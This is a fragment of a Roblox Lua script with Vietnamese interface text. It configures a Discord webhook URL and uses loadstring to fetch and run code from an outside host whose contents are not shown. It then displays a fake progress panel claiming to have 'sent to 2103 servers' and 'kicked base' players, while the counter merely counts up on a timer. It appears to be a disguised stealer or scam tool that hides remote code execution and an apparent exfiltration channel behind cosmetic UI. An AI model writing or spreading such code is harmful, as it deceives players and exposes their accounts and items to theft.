...
fenv.webhook = "https://discord.com/api/webhooks/1430778903609348096/-EAKoDyyXBVww8S0RkDXdRCLUmKPZ_hBCcQOdPMqAJG-6LfSLRmw_TGQFJ3Qv4u_ORP5="
loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xrdcqHxTUXzvYw6m/raw"))()
]]


-- CoreGui panel che nút Roblox; chữ "Đã gửi..." tan biến khi đạt 1731; panel + nút + toast giữ nguyên
...
bigCounter.Text = "Đã gửi tới 0 sever"
...
toast.Text = "Đã kick base dưới 50m/s"
...
local function startRun()
	...
	hb = RunService.Heartbeat:Connect(function()
		...
		if el >= DURATION then
			bigCounter.Text = "Đã gửi tới 2103 sever"
			...
			-- Hiện toast 10 lần
			task.spawn(function() showKickToastsNTimes(20) end)
			return
		end
		local val = START + math.floor((ENDV - START) * (el / DURATION))
		if val ~= last then
			last = val
			bigCounter.Text = "Đã gửi tới " .. val .. " sever"
		end
	end)
end

button.MouseButton1Click:Connect(startRun)        